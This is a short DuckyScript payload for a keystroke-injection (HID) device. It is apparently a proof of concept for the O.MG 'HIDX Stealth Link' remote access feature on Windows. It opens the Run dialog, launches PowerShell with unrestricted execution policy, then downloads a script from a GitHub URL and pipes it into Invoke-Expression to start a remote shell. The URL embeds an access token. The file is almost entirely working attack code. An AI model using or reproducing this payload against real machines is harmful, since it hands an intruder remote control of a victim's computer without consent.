REM       HIDX_Stealth_Link_Remote_Access_PoC_IEX
REM       Version 1.0
REM       OS: Windows
REM       Requirements: Firmware Version 3.0 minimum, Universal Python Listener, Activated HIDX

REM       HID based remote shell, executed via powershell.

REM Define the URL where you hosted your PoC
DEFINE #URL (https://raw.githubusercontent.com/gunz0blazin/OMG-Scripts/refs/heads/main/REM%20HIDX_Stealth_Link_Remote_Access_PoC_.md?token=GHSAT0AAAAAAC5YCZG2TFRKYJ5SUWGI5EGMZ4ROURA)

REM Define Keymap below
DUCKY_LANG us
DELAY 2000
GUI r
DELAY 500
STRINGLN powershell -executionpolicy unrestricted
DELAY 1000
REM Calling HIDX poc via Invoke-Webrequest and execute it via Invoke-Expression
STRINGLN Invoke-WebRequest -UseBasicParsing -Uri "#URL" | iex;HIDXShell
